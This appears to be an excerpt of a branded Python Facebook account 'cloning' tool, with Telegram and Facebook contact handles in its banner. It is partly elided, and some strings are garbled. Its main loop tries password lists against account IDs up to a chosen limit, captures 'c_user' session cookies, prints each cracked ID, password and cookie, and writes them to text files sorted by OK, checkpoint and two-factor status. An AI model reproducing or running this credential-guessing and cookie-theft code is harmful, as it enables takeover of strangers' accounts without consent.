...
\033[1;34m[Telegram : @XWMNSK]

\033[1;34m[Facebook : AlborhST]

\033[1;34m[To update : 2.0.0.1]

 \033[1;34m      
]يﺭﻮﺘﺳ هﺭﻮﺒﻟﺍ تﺍﺩﻻﺍ رﻮﻄﻣ[
...
def xyz():
    ...
    os.system("xdg-open https");print(logo)
...
def Random():
    ...
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  A L B O R H S T   \033[0;m]")
    print(f"")
    linex()
    print(f"")
    ...
    print(f"          \x1b[97m[\033[37;41m  A L B O R H S T  \033[0;m]")
    print(f"")
    limit = int(input(' A L B O R H S T: 1000, 3000, 5000, 50000,  10000\n\n PUT CLONING LIMIT: '))
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬[ALBORH ST-OK😁🐸]●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\nNUMBER : '+uid+'\nPASSWORD   : '+cid+' Ã¢Ë†Å¡ '+ps+ '\nCOOKIE   : '+coki+'\n●▬▬▬▬▬▬▬▬▬▬▬▬▬')   
                cek_apk(session,coki)
                open('/sdcard/ALBORH ST-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r\033[1;31m [ALBORH ST-CP😭🥺] \nNUMBER : '+uid+'\nPASSWORD   : '+ps+ '\n------------------------------------')
                open('/sdcard/ALBORH ST-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/ALBORH ST-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[ALBORH ST] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))),
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
